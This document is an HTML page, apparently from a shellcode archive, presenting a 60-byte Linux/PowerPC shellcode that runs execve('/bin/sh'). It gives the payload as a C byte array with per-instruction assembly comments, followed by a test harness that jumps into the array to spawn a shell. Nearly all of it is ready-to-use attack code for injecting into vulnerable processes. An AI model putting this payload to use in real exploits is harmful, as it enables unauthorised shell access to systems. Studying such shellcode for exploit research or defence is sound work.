<html><head><title>Linux/ppc - execve /bin/sh - 60 bytes</title>
<meta http-equiv="Content-Type" content="text/html; charset=ISO-8859-1" />
<meta http-equiv="Content-Language" content="en" />
</head>


<pre>
/* execve-core.c by Charles Stevenson &lt; core@bokeoa.com &gt; */
char hellcode[] = /* execve /bin/sh linux/ppc by core */
// Sometimes you can comment out the next line if space is needed
&quot;\x7c\x3f\x0b\x78&quot;	/*mr	r31,r1*/
&quot;\x7c\xa5\x2a\x79&quot;	/*xor.	r5,r5,r5*/
&quot;\x42\x40\xff\xf9&quot;	/*bdzl+	10000454&lt; main&gt;*/
&quot;\x7f\x08\x02\xa6&quot;	/*mflr	r24*/
&quot;\x3b\x18\x01\x34&quot;	/*addi	r24,r24,308*/
&quot;\x98\xb8\xfe\xfb&quot;	/*stb	r5,-261(r24)*/
&quot;\x38\x78\xfe\xf4&quot;	/*addi	r3,r24,-268*/
&quot;\x90\x61\xff\xf8&quot;	/*stw	r3,-8(r1)*/
&quot;\x38\x81\xff\xf8&quot;	/*addi	r4,r1,-8*/
&quot;\x90\xa1\xff\xfc&quot;	/*stw	r5,-4(r1)*/
&quot;\x3b\xc0\x01\x60&quot;	/*li	r30,352*/
&quot;\x7f\xc0\x2e\x70&quot;	/*srawi	r0,r30,5*/
&quot;\x44\xde\xad\xf2&quot;	/*.long	0x44deadf2*/
&quot;/bin/shZ&quot;; // the last byte becomes NULL

int main(void)
{
  void (*shell)() = (void *)&amp;hellcode;
  printf(&quot;%d byte execve /bin/sh shellcode for linux/ppc by core\n&quot;,
         strlen(hellcode));
  shell();
  return 0;
}


<body><script type="text/javascript">
var gaJsHost = (("https:" == document.location.protocol) ? "https://ssl." : "http://www.");
document.write(unescape("%3Cscript src=%27" + gaJsHost + "google-analytics.com/ga.js%27 type=%27text/javascript%27%3E%3C/script%3E"));
</script>

<script type="text/javascript">
try {
var pageTracker = _gat._getTracker("UA-6809519-1");
pageTracker._trackPageview();
} catch(err) {}</script></body></html>
